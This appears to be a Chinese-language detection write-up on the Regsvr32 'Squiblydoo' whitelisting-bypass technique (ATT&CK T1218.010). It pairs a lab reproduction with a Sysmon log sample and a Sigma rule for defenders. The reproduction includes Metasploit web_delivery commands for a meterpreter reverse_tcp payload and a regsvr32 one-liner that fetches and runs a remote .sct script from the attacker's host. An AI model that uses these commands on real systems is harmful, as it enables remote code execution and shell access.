# T1218-010-win-基于白名单Regsvr32执行payload

## 来自ATT&CK的描述

命令行程序Regsvr32.exe用于在Windows系统上注册和注销对象链接及嵌入控件，包括动态链接库（DLL）。Regsvr32.exe可用于执行任意二进制文件。

攻击者可能会利用此功能代理执行代码，从而避免触发那些可能不会监控regsvr32.exe进程执行及其加载模块的安全工具，因为正常操作中使用regsvr32.exe的Windows会有白名单或误报。Regsvr32.exe也是微软签名的二进制文件。

Regsvr32.exe还可用于专门绕过进程白名单，方法是加载COM脚本小程序在用户权限下执行动态链接库。由于regsvr32.exe具有网络和代理感知功能，可以在调用期间将URL作为参数传递到外部web服务器上的文件来加载脚本。此方法不对注册表进行任何更改，因为COM对象实际上未注册，仅执行。这个技术变种通常称为“Squiblydoo”攻击，已被攻击者用于针对政府的活动中。

攻击者还可能会利用Regsvr32.exe来注册COM对象以便通过COM劫持建立持久性。

## 测试案例

Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。但搭配regsvr32.exe使用的 DLL，需要提供 DllRegisterServer 和 DllUnregisterServer两个输出函式，或者提供DllInstall输出函数。

说明：Regsvr32.exe所在路径已被系统添加PATH环境变量中，因此，Regsvr32命令可识别。

默认位置：

```bash
C:\WINDOWS\SysWOW64\regsvr32.exe
C:\WINDOWS\system32\regsvr32.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7（sysmon日志）

### 攻击分析

#### 配置MSF

```bash
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 3
target => 3
msf5 exploit(multi/script/web_delivery) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Using URL: http://0.0.0.0:8080/06Yud7aXXqYqT
[*] Local IP: http://192.168.126.146:8080/06Yud7aXXqYqT
[*] Server started.
[*] Run the following command on the target machine:
regsvr32 /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll
```

#### 靶机执行payload

```cmd
regsvr32 /s /n /u /i:http://192.168.126.146:8080/jnOUcgr0b0 scrobj.dll
```

#### 反弹shell

```bash
msf5 exploit(multi/script/web_delivery) > [*] 192.168.126.149  web_delivery - Handling .sct Request
[*] 192.168.126.149  web_delivery - Delivering Payload (1900 bytes)
[*] 192.168.126.149  web_delivery - Handling .sct Request
```

以失败告终，windows powershell已停止工作

## 测试留痕

```log
EventID：1
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Microsoft(C) Register Server
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: regsvr32  /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll
# sysmon日志
```

## 检测规则/思路

### sigma规则

```yml
title: Regsvr32 Anomaly
status: experimental
description: Detects various anomalies in relation to regsvr32.exe
author: Florian Roth
date: 2019/01/16
references:
    - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html
tags:
    - attack.t1117
    - attack.defense_evasion
    - attack.execution
    - car.2019-04-002
    - car.2019-04-003
logsource:
    category: process_creation
    product: windows
detection:
    selection1:
        Image: '*\regsvr32.exe'
        CommandLine: '*\Temp\\*'
    selection2:
        Image: '*\regsvr32.exe'
        ParentImage: '*\powershell.exe'
    selection3:
        Image: '*\regsvr32.exe'
        ParentImage: '*\cmd.exe'
    selection4:
        Image: '*\regsvr32.exe'
        CommandLine:
            - '*/i:http* scrobj.dll'
            - '*/i:ftp* scrobj.dll'
    selection5:
        Image: '*\wscript.exe'
        ParentImage: '*\regsvr32.exe'
    selection6:
        Image: '*\EXCEL.EXE'
        CommandLine: '*..\..\..\Windows\System32\regsvr32.exe *'
    condition: 1 of them
fields:
    - CommandLine
    - ParentCommandLine
falsepositives:
    - Unknown
level: high
```

### 建议

通过进程监控来检测和分析regsvr32.exe的执行和参数。比较regsvr32.exe的近期调用与历史已知合法参数及已加载文件来确定是否有异常和潜在的攻击活动。在regsvr32.exe调用之前和之后使用的命令参数也可用于确定正在加载的脚本或者动态链接库的来源和目的。

## 参考推荐

MITRE-ATT&CK-T1218-010

<https://attack.mitre.org/techniques/T1218/010/>
